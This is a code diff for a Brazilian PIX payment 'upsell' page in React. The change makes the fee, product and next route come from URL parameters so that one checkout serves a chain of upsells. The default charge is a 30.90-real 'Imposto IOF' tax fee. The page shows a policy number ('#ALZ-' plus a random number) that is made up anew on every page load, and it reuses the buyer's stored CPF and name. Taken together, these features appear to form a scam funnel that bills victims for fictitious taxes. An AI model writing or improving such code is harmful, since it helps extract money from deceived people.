@@ -1,17 +1,32 @@
 import { useState, useEffect } from 'react'
-import { useLocation, useNavigate } from 'react-router-dom'
+import { useNavigate, useSearchParams } from 'react-router-dom'
 
 // ── Config ─────────────────────────────────────────────────────────────────────
-const AMOUNT            = 30.90
-const TOTAL_DISPLAY     = 'R$ 30,90'
+// Amount, product and the next upsell route are dynamic — driven by URL params
+// (?fee=&produto=&next=) so this single checkout serves every upsell in the chain.
+const DEFAULT_FEE      = 30.90
+const DEFAULT_PRODUCT  = 'Imposto IOF'
+const DEFAULT_NEXT     = '/up2'
 const COUNTDOWN_SECONDS = 300
 const STATUS_POLL_MS    = 5000
-const NEXT_UPSELL_ROUTE = '/up2'
 
 // Stable apólice number per page load
 const APOLICE = '#ALZ-' + (1000 + Math.floor(Math.random() * 9000))
 
 // ── Helpers ────────────────────────────────────────────────────────────────────
+
+function fmtBRL(v) {
+  return 'R$ ' + Number(v).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+}
+
+function buildNextUrl(path) {
+  const params = new URLSearchParams(window.location.search)
+  params.delete('fee')
+  params.delete('produto')
+  params.delete('next')
+  const query = params.toString()
+  return query ? `${path}?${query}` : path
+}
 
 function generateEmail(nome) {
   const parts = (nome || '')
@@ -73,27 +88,23 @@ function getStoredUserData() {
   }
 }
 
-async function createPixPayment(userData, pixKeyType, pixKey) {
+async function createPixPayment(userData, amount, product) {
   const email = generateEmail(userData.nome)
-  const phoneNumber = pixKeyType === 'telefone'
-    ? pixKey.replace(/\D/g, '')
-    : undefined
 
   const res = await fetch('/api/pix-upsell', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      amount: AMOUNT,
+      amount,
       client: {
         name:     userData.nome,
         document: formatCpf(userData.cpf),
-        phoneNumber,
         email,
       },
       shippingAmount: 0,
       discountAmount: 0,
       products: [
-        { description: 'Imposto IOF', quantity: 1, value: AMOUNT },
+        { description: product, quantity: 1, value: amount },
       ],
       trackingParameters: getUtmParams(),
     }),
@@ -161,13 +172,14 @@ function CoberturaItem({ label, icon }) {
 // ── Main component ─────────────────────────────────────────────────────────────
 
 export default function PaymentUpsell() {
-  const location = useLocation()
   const navigate = useNavigate()
-  const state = location.state || {}
+  const [searchParams] = useSearchParams()
+  const amount     = Number(searchParams.get('fee')) || DEFAULT_FEE
+  const product    = searchParams.get('produto') || DEFAULT_PRODUCT
+  const nextRoute  = searchParams.get('next') || DEFAULT_NEXT
+  const totalDisplay = fmtBRL(amount)
   // Upsell checkouts always reuse the user's data saved earlier in the main checkout
-  const userData    = getStoredUserData()
-  const pixKeyType  = state.pixKeyType
-  const pixKey      = state.pixKey
+  const userData = getStoredUserData()
 
   const [loading,       setLoading]       = useState(true)
   const [error,         setError]         = useState(false)
@@ -186,7 +198,7 @@ export default function PaymentUpsell() {
   // Call payment API on mount
   useEffect(() => {
     if (!userData) return
-    createPixPayment(userData, pixKeyType, pixKey)
+    createPixPayment(userData, amount, product)
       .then(({ idTransaction: id, pixCode: code, qrBase64: img }) => {
         setIdTransaction(id)
         setPixCode(code)
@@ -220,7 +232,7 @@ export default function PaymentUpsell() {
           console.log('[PIX] Status:', data.status)
           if (data.status === 'paid') {
             setPaid(true)
-            navigate(NEXT_UPSELL_ROUTE + window.location.search)
+            navigate(buildNextUrl(nextRoute))
           }
         })
         .catch(err => console.log('[PIX] Erro ao consultar status:', err))
@@ -272,7 +284,7 @@ export default function PaymentUpsell() {
         {/* Total */}
         <div className="flex items-center justify-between pb-4 mb-5 border-b-2 border-green-500">
           <span className="text-lg font-bold text-gray-800">Total</span>
-          <span className="text-lg font-extrabold text-gray-800">{TOTAL_DISPLAY}</span>
+          <span className="text-lg font-extrabold text-gray-800">{totalDisplay}</span>
         </div>
 
         {/* PIX section header */}
